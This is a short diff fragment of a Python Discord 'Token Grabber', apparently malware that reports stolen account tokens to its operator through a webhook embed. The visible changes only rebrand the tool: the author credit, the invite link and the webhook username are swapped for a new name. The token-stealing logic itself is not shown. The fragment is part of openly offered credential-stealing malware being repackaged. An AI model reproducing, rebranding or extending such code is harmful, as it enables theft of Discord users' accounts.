@@ -137,8 +137,8 @@ def main():
                 "color": 0xff00cd,
                 "fields": [
                     {
-                        "name": "Made by Rushia.BasH",
-                        "value": f'Join our discord server https://discord.gg/Pw4GxgKzsk',
+                        "name": "Made by SuzukaNakamoto",
+                        "value": f'Join our discord server **invalid invite**',
                         "inline": False
                     },
                     {
@@ -170,7 +170,7 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Rushia's Token Grabber",
+        "username": "Suzuka's Token Grabber",
         "avatar_url": "https://cdn.discordapp.com/attachments/756524108459540582/907284779022569472/500x500.jpg"
     }
     try:                #webhook under this message
